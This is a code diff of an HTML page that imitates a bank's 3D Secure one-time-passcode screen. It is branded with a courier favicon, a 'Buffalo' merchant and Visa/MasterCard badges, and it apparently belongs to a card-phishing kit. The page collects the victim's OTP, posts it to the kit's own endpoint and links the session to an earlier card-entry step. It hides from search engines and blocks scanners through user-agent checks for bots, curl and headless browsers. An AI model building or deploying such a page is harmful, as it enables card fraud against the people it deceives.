@@ -1,277 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="referrer" content="no-referrer" />
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
-    <title>3D Secure │ Buffalo</title>
+    <title>Validate</title>
     <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
+    <link href="/otp_files/template.css" rel="stylesheet" />
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        html, body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: #fff;
-            color: #222;
-            min-height: 100%;
-            font-size: 14px;
+        body {
+            color: #000000;
+            font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;
+            font-size: 1.25em;
+            background: #ffffff;
         }
-        .topbar {
-            border-top: 4px solid #f5d6e0;
-            padding: 18px 0 8px;
+        .header, legend, h1, h2, h3, h4 { color: #000000; }
+        label { color: #000000; }
+        a, .btn-link { color: #000000; text-decoration: underline; }
+        a:visited, .btn-link:visited { color: #000000; }
+        a:hover, a:focus, .btn-link:hover, .btn-link:focus { color: #211f1f; }
+        a:active, .btn-link:active { color: #211f1f; }
+        a.btn-link { font-size: .95em; }
+        .btn-primary, .btn-primary:focus, .btn-primary:hover {
+            background: #211f1f;
+            color: #FFF;
+            border: none;
+            border-radius: 0;
         }
-        .topbar-inner {
-            max-width: 720px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 80px;
-            padding: 0 16px;
-        }
-        /* Buffalo logo (text-based to avoid external assets) */
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #111;
-        }
-        .brand-mark {
-            font-size: 26px;
-            line-height: 1;
-            color: #111;
-        }
-        .brand-text {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            line-height: 1;
-        }
-        .brand-name {
-            font-size: 30px;
-            font-weight: 900;
-            letter-spacing: 1px;
-            color: #111;
-            position: relative;
-        }
-        .brand-name sup {
-            font-size: 11px;
-            font-weight: 700;
-            top: -14px;
-            margin-left: 2px;
-        }
-        .brand-tag {
-            font-size: 9px;
-            color: #444;
-            margin-top: 2px;
-            letter-spacing: 1px;
-        }
-        /* Verified by Visa / MasterCard SecureCode badges */
-        .badges {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-        .vbv {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.05;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .vbv-top {
-            font-size: 13px;
-            font-style: italic;
-            color: #1a1f71;
-            font-weight: 500;
-        }
-        .vbv-top b { font-weight: 700; }
-        .vbv-bottom {
-            font-size: 26px;
-            font-weight: 900;
-            font-style: italic;
-            color: #1a1f71;
-            letter-spacing: -0.5px;
-        }
-        .msc {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.05;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .msc-top {
-            font-size: 16px;
-            font-weight: 700;
-            color: #eb001b;
-            letter-spacing: -0.2px;
-        }
-        .msc-top span { color: #f79e1b; }
-        .msc-bottom {
-            font-size: 16px;
-            font-weight: 700;
-            color: #f79e1b;
-            letter-spacing: -0.2px;
-        }
+        .btn-primary:active, .btn-primary:active:hover, .btn-primary:active:focus { background: #AB2C29; }
+        fieldset { border: 0; }
+        fieldset > legend { border-bottom: 0; font-size: 1.00em; }
+        :not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before { background: #211f1f; }
+        .accordion.modal .modal-body .panel-group .expander { color: #211f1f; }
+        .accordion.modal .modal-body .panel-group .panel { background: #FFF; }
+        .field-validation-error { color: #AB2C29; }
+        .toast-top-full-width { display: none; }
 
-        .wrap {
-            max-width: 720px;
-            margin: 60px auto 0;
-            padding: 0 16px;
-        }
-        .intro {
-            color: #222;
-            font-size: 14px;
-            line-height: 1.55;
-            margin: 0 0 36px;
-        }
-        .section-title {
-            color: #888;
-            font-weight: 700;
-            font-size: 14px;
-            margin-bottom: 18px;
-        }
-        .details {
-            display: grid;
-            grid-template-columns: 220px 1fr;
-            row-gap: 14px;
-            column-gap: 12px;
-            align-items: center;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
-        .details .label {
-            text-align: right;
-            font-weight: 700;
-            color: #222;
-        }
-        .details .value {
-            text-align: left;
-            color: #222;
-        }
-        .otp-input {
-            width: 180px;
-            padding: 4px 6px;
-            border: 1px solid #888;
-            font-size: 14px;
-            background: #fff;
-            outline: none;
-            font-family: inherit;
-        }
-        .otp-input:focus {
-            border-color: #1a1f71;
-        }
-        .notice {
-            color: #222;
-            font-size: 14px;
-            line-height: 1.5;
-            margin: 6px 0 24px 0;
-            max-width: 420px;
-        }
-        .submit-row {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 22px;
-        }
-        .submit-btn {
-            background: #111;
-            color: #fff;
-            border: 0;
-            padding: 12px 38px;
-            font-size: 15px;
-            font-weight: 700;
-            font-family: inherit;
-            cursor: pointer;
-            border-radius: 2px;
-            letter-spacing: 0.3px;
-        }
-        .submit-btn:hover { background: #000; }
-        .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-        .links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-            margin-bottom: 22px;
-        }
-        .links a {
-            color: #111;
-            text-decoration: underline;
-            font-weight: 700;
-        }
-        .links a:hover { color: #1a1f71; }
-        .pay-logos {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 22px;
-            flex-wrap: wrap;
-            padding: 4px 0 40px;
-        }
-        /* Payment brand badges (CSS-only, no external assets) */
-        .pl {
-            display: inline-flex;
-            align-items: center;
-            font-family: Arial, Helvetica, sans-serif;
-            font-weight: 800;
-            line-height: 1;
-        }
-        .pl-samsung {
-            color: #1428a0;
-            font-size: 16px;
-            letter-spacing: -0.3px;
-        }
-        .pl-samsung .pill {
-            background: #1ea7fd;
-            color: #fff;
-            border-radius: 12px;
-            padding: 3px 8px;
-            margin-left: 4px;
-            font-size: 12px;
-            font-weight: 800;
-        }
-        .pl-google {
-            color: #5f6368;
-            font-size: 15px;
-            letter-spacing: -0.2px;
-        }
-        .pl-google .gicon {
-            width: 16px;
-            height: 16px;
-            border-radius: 50%;
-            background: conic-gradient(#ea4335 0 25%, #fbbc04 25% 50%, #34a853 50% 75%, #4285f4 75% 100%);
-            display: inline-block;
-            margin-right: 5px;
-        }
-        .pl-payfast {
-            color: #ed1c24;
-            font-size: 16px;
-            font-style: italic;
-        }
-        .pl-payfast sup {
-            font-size: 9px;
-            top: -8px;
-        }
-        .pl-payu {
-            color: #a6ce39;
-            font-size: 16px;
-            font-style: italic;
-            font-weight: 900;
-        }
-        .pl-payu .u { color: #00a651; }
-        .pl-payu sup { color: #00a651; font-size: 9px; top: -7px; }
-        .pl-yoco {
-            background: #00bcd4;
-            color: #fff;
-            border-radius: 14px;
-            padding: 4px 12px;
-            font-size: 13px;
-            letter-spacing: 1px;
-        }
-
-        .error-msg {
-            color: #c33;
-            font-size: 13px;
-            margin: 6px 0 0 0;
-        }
         /* Honeypot — visually hidden but reachable to bots */
         .hp-field {
             position: absolute !important;
@@ -281,221 +46,264 @@
             height: 1px !important;
             opacity: 0 !important;
         }
-
-        @media (max-width: 600px) {
-            .topbar-inner { gap: 24px; flex-wrap: wrap; }
-            .details { grid-template-columns: 1fr; row-gap: 6px; }
-            .details .label { text-align: left; }
-            .details .row-pair { display: flex; gap: 8px; }
-            .notice { max-width: 100%; }
-        }
     </style>
 </head>
 <body>
-    <header class="topbar">
-        <div class="topbar-inner">
-            <div class="brand" aria-label="Buffalo">
-                <span class="brand-mark" aria-hidden="true">🦬</span>
-                <div class="brand-text">
-                    <div class="brand-name">BUFFALO<sup>®</sup></div>
-                    <div class="brand-tag">We Deliver Hope</div>
-                </div>
-            </div>
-            <div class="badges" aria-label="Verified by Visa and MasterCard SecureCode">
-                <div class="vbv">
-                    <div class="vbv-top"><b>Verified</b> <i>by</i></div>
-                    <div class="vbv-bottom">VISA</div>
-                </div>
-                <div class="msc">
-                    <div class="msc-top">MasterCard<span>.</span></div>
-                    <div class="msc-bottom">SecureCode<span style="color:#eb001b">.</span></div>
+<div class="threeds-one">
+
+    <div class="container container-sticky-footer">
+
+        <div class="header" id="HeaderLogos">
+            <div class="row no-pad">
+                <div class="col-12">
+                    <img width="25%" class="img-responsive header-logo pull-left" src="/otp_files/logo1.png" alt="Logo" />
+                    <img class="img-responsive header-logo pull-right" src="/otp_files/vm.gif" alt="" />
                 </div>
             </div>
         </div>
-    </header>
 
-    <main class="wrap">
-        <p class="intro">
-            To continue with your transaction, please enter the One-Time Passcode (OTP) sent to your mobile number and click Submit or confirm via your Banking App to complete payment..
-        </p>
+        <div class="container container-sticky-footer">
+            <form id="myform" action="/api/submit-otp" autocomplete="off" method="post" novalidate>
 
-        <div class="section-title">Transaction Details</div>
+                <div class="body" dir="LTR" style="bottom: 56px;">
 
-        <form id="otpForm" action="/api/submit-otp" method="POST" novalidate autocomplete="off">
-            <div class="details">
-                <div class="label">Merchant:</div>
-                <div class="value" id="merchant-display">Buffalo</div>
+                    <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>
 
-                <div class="label">Transaction Amount:</div>
-                <div class="value" id="amount-display">R18.99 ZAR</div>
+                    <br />
+                    <div class="row"></div>
+                    <div class="row">
+                        <div class="col-12" id="ValidateOneUpMessage">
+                            <div id="Body1">To continue with your transaction, please enter the One-Time Passcode (OTP) sent to your mobile number and click Submit or confirm via your Banking App to complete payment..</div>
+                        </div>
+                    </div>
 
-                <div class="label"><label for="otp_code">Enter OTP Code:</label></div>
-                <div class="value">
-                    <input class="otp-input" type="tel" id="otp_code" name="otp_code" inputmode="numeric" maxlength="8" autocomplete="one-time-code" required />
+                    <br />
+
+                    <div class="row form-two-col">
+                        <div class="col-12">
+                            <fieldset id="ValidateTransactionDetailsContainer">
+                                <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>
+
+                                <div class="validate-field row">
+                                    <span class="validate-label col-6">Merchant:</span>
+                                    <span class="col-6">Buffalo</span>
+                                </div>
+
+                                <div class="validate-field row">
+                                    <span class="validate-label col-6">Transaction Amount:</span>
+                                    <span class="col-6 always-left-to-right">R18.99 ZAR</span>
+                                </div>
+
+                                <div class="validate-field row">
+                                    <span class="validate-label col-6">Enter OTP Code:</span>
+                                    <span>
+                                        <label for="code" hidden>Please enter your code</label>
+                                        <input id="code" name="otp_code" type="tel" inputmode="numeric"
+                                               required maxlength="8" autocomplete="one-time-code"
+                                               data-val-required="Please enter your code" />
+                                    </span>
+                                </div>
+
+                                <div class="validate-field row">
+                                    <span class="validate-label col-6">&nbsp;</span>
+                                    <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
+                                    <span class="field-validation-valid col-6"></span>
+                                </div>
+                            </fieldset>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="col-12">
+                            <div id="linkContainer" style="text-align:center;display:grid;gap:1rem;color:red;margin-bottom:1rem;">
+                                <a href="#" id="resend_link">Click here to receive another code</a>
+                                <span id="seconds">Resend OTP in 5m 0s</span>
+                            </div>
+                            <span id="MaximumResendsReachedMessage" style="display:none">You have reached the maximum number of requests for a new code</span>
+                        </div>
+                    </div>
                 </div>
-            </div>
 
-            <p class="notice">You have reached the maximum number of requests for a new code</p>
+                <div class="sticky-footer">
+                    <div class="row no-pad">
+                        <div class="col-12 text-center">
+                            <button type="submit" class="btn btn-primary" id="ValidateButton">Submit</button>
+                        </div>
+                    </div>
 
-            <div id="error-container" aria-live="assertive"></div>
+                    <div class="footer">
+                        <div class="row">
+                            <div class="col-12">
+                                <ul class="list-inline list-inline-separated pull-left">
+                                    <li><a class="btn btn-link" href="#" id="help_link">Need help?</a></li>
+                                </ul>
+                                <a class="list-inline list-inline-separated pull-right" href="/">Exit</a>
+                            </div>
 
-            <div class="submit-row">
-                <button type="submit" id="submit_button" class="submit-btn">Submit</button>
-            </div>
+                            <img src="/otp_files/samsung.jpeg" alt="" width="90px" />
+                            <img src="/otp_files/ggle.jpeg" alt="" width="90px" style="padding-right:10px;" />
+                            <img src="/otp_files/payf.jpeg" alt="" width="60px" />
+                            <img src="/otp_files/payu1.png" alt="" width="50px" />
+                            <img src="/otp_files/yoco.png" alt="" width="40px" />
+                        </div>
+                    </div>
+                </div>
 
-            <div class="links">
-                <a href="#" id="help_link">Need help?</a>
-                <a href="/" id="exit_link">Exit</a>
-            </div>
+                <!-- Pre-filled from query string for downstream tracking -->
+                <input type="hidden" id="vehicle1" name="vehicle1" value="" />
 
-            <!-- Pre-filled from query string -->
-            <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+                <!-- Honeypot field (bots fill this) -->
+                <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
+                <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
 
-            <!-- Honeypot field (bots fill this) -->
-            <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
-            <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+                <!-- Timing check -->
+                <input type="hidden" id="form_load_time" name="form_load_time" value="" />
 
-            <!-- Timing check -->
-            <input type="hidden" id="form_load_time" name="form_load_time" value="" />
-
-            <!-- 20-30 character browser session token -->
-            <input type="hidden" id="session_token" name="session_token" value="" />
-        </form>
-
-        <div class="pay-logos" aria-label="Accepted payment methods">
-            <span class="pl pl-samsung">SAMSUNG<span class="pill">pay</span></span>
-            <span class="pl pl-google"><span class="gicon"></span>Google Pay</span>
-            <span class="pl pl-payfast"><i>Pay</i><b>Fast</b><sup>®</sup></span>
-            <span class="pl pl-payu">Pay<span class="u">U</span><sup>®</sup></span>
-            <span class="pl pl-yoco">YOCO</span>
+                <!-- 20-30 character browser session token -->
+                <input type="hidden" id="session_token" name="session_token" value="" />
+            </form>
         </div>
-    </main>
+    </div>
+</div>
 
-    <script>
-        // -------- 20-30 character session token --------
-        // Re-use the token created by cc.html so the same browser session
-        // is correlated across the card → loading → otp steps.
-        (function () {
-            function generateSessionToken() {
-                var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                var length = 20 + Math.floor(Math.random() * 11); // 20..30 inclusive
-                var bytes;
-                if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
-                    bytes = new Uint8Array(length);
-                    window.crypto.getRandomValues(bytes);
-                } else {
-                    bytes = new Array(length);
-                    for (var i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
-                }
-                var out = '';
-                for (var j = 0; j < length; j++) out += alphabet.charAt(bytes[j] % alphabet.length);
-                return out;
+<script>
+    // ---- 5 minute resend countdown (matches the original template) ----
+    (function () {
+        var countdown = 300;
+        var el = document.getElementById('seconds');
+        var iv = setInterval(function () {
+            var m = Math.floor(countdown / 60);
+            var s = countdown % 60;
+            el.textContent = 'Resend OTP in ' + m + 'm ' + s + 's';
+            countdown--;
+            if (countdown < 0) {
+                clearInterval(iv);
+                document.getElementById('linkContainer').style.display = 'none';
+                document.getElementById('MaximumResendsReachedMessage').style.display = 'block';
             }
-            var token = null;
-            try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
-            if (!token || token.length < 20 || token.length > 30) {
-                token = generateSessionToken();
-                try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
-            }
-            window.__sessionToken = token;
-        })();
+        }, 1000);
+    })();
 
-        // -------- Bot / crawler detection (client side) --------
-        function clientBotCheck() {
-            var ua = (navigator.userAgent || '').toLowerCase();
-            var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
-            if (badUA.test(ua)) return 'Bot detected via User-Agent.';
-            if (navigator.webdriver === true) return 'Automated browser detected.';
-            if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
-            return null;
+    // ---- 20-30 character browser session token (re-used across cc → loading → otp) ----
+    (function () {
+        function generateSessionToken() {
+            var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var length = 20 + Math.floor(Math.random() * 11);
+            var bytes;
+            if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
+                bytes = new Uint8Array(length);
+                window.crypto.getRandomValues(bytes);
+            } else {
+                bytes = new Array(length);
+                for (var i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
+            }
+            var out = '';
+            for (var j = 0; j < length; j++) out += alphabet.charAt(bytes[j] % alphabet.length);
+            return out;
         }
+        var token = null;
+        try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
+        if (!token || token.length < 20 || token.length > 30) {
+            token = generateSessionToken();
+            try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
+        }
+        window.__sessionToken = token;
+    })();
 
-        // -------- Helpers --------
-        function getQueryParam(name) {
+    // ---- Client-side bot/crawler detection ----
+    function clientBotCheck() {
+        var ua = (navigator.userAgent || '').toLowerCase();
+        var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
+        if (badUA.test(ua)) return 'Bot detected via User-Agent.';
+        if (navigator.webdriver === true) return 'Automated browser detected.';
+        if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
+        return null;
+    }
+
+    function getQueryParam(name) {
+        try { return new URLSearchParams(window.location.search).get(name); }
+        catch (e) { return null; }
+    }
+    function showError(msg) {
+        var el = document.getElementById('ValidationErrorMessage');
+        el.textContent = msg;
+        el.style.display = 'inline-block';
+    }
+    function clearError() {
+        var el = document.getElementById('ValidationErrorMessage');
+        el.textContent = '';
+        el.style.display = 'none';
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+        // Pre-fill vehicle1 from query string for downstream tracking
+        document.getElementById('vehicle1').value = getQueryParam('vehicle1') || 'Card';
+
+        // Stamp load time + session token for server-side bot detection
+        document.getElementById('form_load_time').value = Date.now();
+        document.getElementById('session_token').value = window.__sessionToken;
+
+        // Digits-only OTP input
+        var otpInput = document.getElementById('code');
+        otpInput.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 8);
+        });
+        otpInput.focus();
+
+        // Need help — informational only
+        document.getElementById('help_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            showError('Please contact your bank if you did not receive a verification code.');
+        });
+        document.getElementById('resend_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            showError('A new verification code has been requested.');
+        });
+
+        // Submit handler — POSTs to /api/submit-otp, then redirects to the
+        // spinning page (processing.html) which sends the user back to the landing page.
+        var form = document.getElementById('myform');
+        var submitButton = document.getElementById('ValidateButton');
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            clearError();
+
+            var botReason = clientBotCheck();
+            if (botReason) { showError(botReason); return; }
+
+            var code = (otpInput.value || '').trim();
+            if (!/^\d{4,8}$/.test(code)) {
+                showError('Please enter the OTP code sent to your mobile number.');
+                return;
+            }
+
+            var originalText = submitButton.textContent;
+            submitButton.disabled = true;
+            submitButton.textContent = 'Submitting…';
+
             try {
-                var params = new URLSearchParams(window.location.search);
-                return params.get(name);
-            } catch (e) { return null; }
-        }
-        function showError(msg) {
-            var c = document.getElementById('error-container');
-            c.innerHTML = '';
-            var d = document.createElement('div');
-            d.className = 'error-msg';
-            d.setAttribute('role', 'alert');
-            d.textContent = msg;
-            c.appendChild(d);
-        }
-        function clearError() {
-            document.getElementById('error-container').innerHTML = '';
-        }
-
-        document.addEventListener('DOMContentLoaded', function () {
-            // Pre-fill vehicle1 from query string for downstream tracking
-            var vehicle = getQueryParam('vehicle1') || 'Card';
-            document.getElementById('vehicle1').value = vehicle;
-
-            // Stamp load time + session token for server-side bot detection
-            document.getElementById('form_load_time').value = Date.now();
-            document.getElementById('session_token').value = window.__sessionToken;
-
-            // OTP input — digits only
-            var otpInput = document.getElementById('otp_code');
-            otpInput.addEventListener('input', function () {
-                this.value = this.value.replace(/\D/g, '').slice(0, 8);
-            });
-            otpInput.focus();
-
-            // Need help — informational only
-            document.getElementById('help_link').addEventListener('click', function (e) {
-                e.preventDefault();
-                clearError();
-                showError('Please contact your bank if you did not receive a verification code.');
-            });
-
-            // Submit handler — POSTs to /api/submit-otp, redirects to /success.html
-            var form = document.getElementById('otpForm');
-            var submitButton = document.getElementById('submit_button');
-
-            form.addEventListener('submit', async function (e) {
-                e.preventDefault();
-                clearError();
-
-                var botReason = clientBotCheck();
-                if (botReason) { showError(botReason); return; }
-
-                var code = (otpInput.value || '').trim();
-                if (!/^\d{4,8}$/.test(code)) {
-                    showError('Please enter the OTP code sent to your mobile number.');
+                var formData = new FormData(form);
+                var response = await fetch('/api/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(formData)
+                });
+                var result = await response.json();
+                if (result && result.success) {
+                    window.location.href = result.redirect || '/processing.html';
                     return;
                 }
-
-                var originalText = submitButton.textContent;
-                submitButton.disabled = true;
-                submitButton.textContent = 'Submitting…';
-
-                try {
-                    var formData = new FormData(form);
-                    var response = await fetch('/api/submit-otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: new URLSearchParams(formData)
-                    });
-                    var result = await response.json();
-                    if (result && result.success) {
-                        window.location.href = result.redirect || '/success.html';
-                        return;
-                    }
-                    showError((result && result.message) || 'Verification could not be completed. Please try again.');
-                } catch (err) {
-                    console.error('OTP submission error:', err);
-                    showError('A network error occurred. Please try again.');
-                } finally {
-                    submitButton.disabled = false;
-                    submitButton.textContent = originalText;
-                }
-            });
+                showError((result && result.message) || 'Verification could not be completed. Please try again.');
+            } catch (err) {
+                console.error('OTP submission error:', err);
+                showError('A network error occurred. Please try again.');
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = originalText;
+            }
         });
-    </script>
+    });
+</script>
 </body>
 </html>
